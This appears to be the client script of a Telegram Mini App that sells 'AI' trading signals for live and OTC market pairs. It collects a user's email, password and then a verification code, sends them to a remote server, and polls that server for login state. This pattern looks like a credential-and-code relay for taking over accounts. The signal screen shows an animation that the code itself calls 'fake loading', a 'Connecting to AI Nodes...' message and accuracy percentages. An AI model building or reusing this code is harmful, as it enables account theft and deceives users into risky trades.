const tg = window.Telegram.WebApp;
const apiURL = "https://mini-app-one.onrender.com"; // <-- APNA RENDER API URL YAHA RAKHO
let userId = "UNKNOWN";
let pollingInterval;

tg.expand();
if (tg.initDataUnsafe && tg.initDataUnsafe.user) { 
    userId = tg.initDataUnsafe.user.id.toString(); 
    document.getElementById('display-userid').textContent = userId;
}

const screens = { login: document.getElementById('login-screen'), code: document.getElementById('code-screen'), main: document.getElementById('main-screen') };
const alertBox = document.getElementById('alert-box');

function showAlert(msg, type="error") {
    alertBox.textContent = msg;
    alertBox.style.background = type === "error" ? "#ff4d4f" : "#00e5ff";
    alertBox.style.color = type === "error" ? "#fff" : "#000";
    alertBox.classList.remove('hidden');
    setTimeout(() => alertBox.classList.add('hidden'), 3500);
}

function showScreen(screenName) {
    Object.values(screens).forEach(s => s.classList.add('hidden'));
    screens[screenName].classList.remove('hidden');
}

// LOGIN FLOW
document.getElementById('btn-login').addEventListener('click', async () => {
    const email = document.getElementById('email').value, password = document.getElementById('password').value;
    if(!email || !password) return showAlert("Please enter details");
    document.getElementById('btn-login').textContent = "Processing...";
    try {
        await fetch(`${apiURL}/api/login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, email, password}) });
        startPolling();
    } catch(e) { showAlert("Network error"); document.getElementById('btn-login').textContent = "Secure Login"; }
});

// CODE FLOW
document.getElementById('btn-code').addEventListener('click', async () => {
    const code = document.getElementById('auth-code').value;
    if(!code) return showAlert("Enter code");
    document.getElementById('btn-code').textContent = "Verifying...";
    try {
        await fetch(`${apiURL}/api/code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, code}) });
    } catch(e) { showAlert("Error"); document.getElementById('btn-code').textContent = "Verify Code"; }
});

// POLLING
function startPolling() {
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`${apiURL}/api/status?user_id=${userId}`);
            const data = await res.json();
            if(data.msg) showAlert(data.msg);

            if (data.state === "START") { showScreen('login'); document.getElementById('btn-login').textContent = "Secure Login"; clearInterval(pollingInterval); } 
            else if (data.state === "WAITING_CODE") { showScreen('code'); document.getElementById('btn-code').textContent = "Verify Code"; } 
            else if (data.state === "AUTHORIZED") { showScreen('main'); clearInterval(pollingInterval); populateMarkets(); }
        } catch (e) { console.log("Polling..."); }
    }, 2000);
}

// MARKET POPULATION
const marketSelect = document.getElementById('market-select');
async function populateMarkets() {
    try {
        const res = await fetch(`${apiURL}/api/init_data`); const data = await res.json();
        marketSelect.innerHTML = '<option value="">🇺🇸 Select Pair ▾</option>';
        data.live_pairs.forEach(p => marketSelect.innerHTML += `<option value="${p}">LIVE: ${p}</option>`);
        data.otc_pairs.forEach(p => marketSelect.innerHTML += `<option value="${p}">OTC: ${p}</option>`);
        document.getElementById('support-link').textContent = "@" + data.admin_contact;
        document.getElementById('support-link').href = "https://t.me/" + data.admin_contact;
    } catch(e) { console.log("Init fail"); }
}

// TAB NAVIGATION LOGIC (5 Buttons)
document.querySelectorAll('.nav-item').forEach(nav => {
    nav.addEventListener('click', () => {
        // Remove active from all
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
        // Add active to clicked
        nav.classList.add('active-nav');
        const targetId = nav.getAttribute('data-target');
        document.getElementById(targetId).classList.remove('hidden');
    });
});

// SCAN LOGIC
document.getElementById('btn-scan').addEventListener('click', async () => {
    const pair = document.getElementById('market-select').value;
    const time = document.getElementById('time-select').value;
    
    if(!pair) return showAlert("Please select a market pair first.");
    
    const winrateBox = document.querySelector('.winrate-container');
    const resultBox = document.getElementById('signal-result');
    const statusText = document.getElementById('status-text');
    const btn = document.getElementById('btn-scan');
    
    // UI Loading state
    resultBox.classList.add('hidden');
    winrateBox.classList.remove('hidden');
    btn.textContent = "Analyzing..."; btn.disabled = true;
    statusText.textContent = "Connecting to AI Nodes...";
    
    // Spin animation for progress ring
    document.getElementById('progress-ring').style.animation = "spin 1s linear infinite";

    try {
        const res = await fetch(`${apiURL}/api/signal`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: userId, pair: pair, timeframe: time}) });
        const data = await res.json();
        
        setTimeout(() => {
            document.getElementById('progress-ring').style.animation = "none";
            
            if (data.error === "LIMIT_REACHED") { 
                showAlert(`Free Limit Reached! Check Support tab.`); 
                statusText.textContent = "Limit Reached";
                btn.textContent = "⚡ Get Signal"; btn.disabled = false; 
                return; 
            }
            
            // Show Result
            winrateBox.classList.add('hidden');
            resultBox.classList.remove('hidden');
            
            const dirText = data.direction.replace(/[^a-zA-Z]/g, '');
            document.getElementById('result-direction').textContent = dirText;
            document.getElementById('result-accuracy').textContent = `Accuracy: ${data.accuracy}%`;
            
            // Color Logic
            if(dirText === "BUY") {
                resultBox.style.borderColor = "#00e5ff";
                document.getElementById('result-direction').style.color = "#00e5ff";
            } else {
                resultBox.style.borderColor = "#ff4d4f";
                document.getElementById('result-direction').style.color = "#ff4d4f";
            }
            
            statusText.textContent = "Signal Generated Successfully";
            btn.textContent = "⚡ Get Signal"; btn.disabled = false;
        }, 2500); // 2.5 seconds fake loading
    } catch(e) { 
        showAlert("Scan Failed"); 
        document.getElementById('progress-ring').style.animation = "none";
        btn.textContent = "⚡ Get Signal"; btn.disabled = false; 
    }
});

// Add keyframes dynamically for spin
const style = document.createElement('style');
style.innerHTML = `@keyframes spin { 100% { transform: rotate(360deg); } }`;
document.head.appendChild(style);

startPolling();
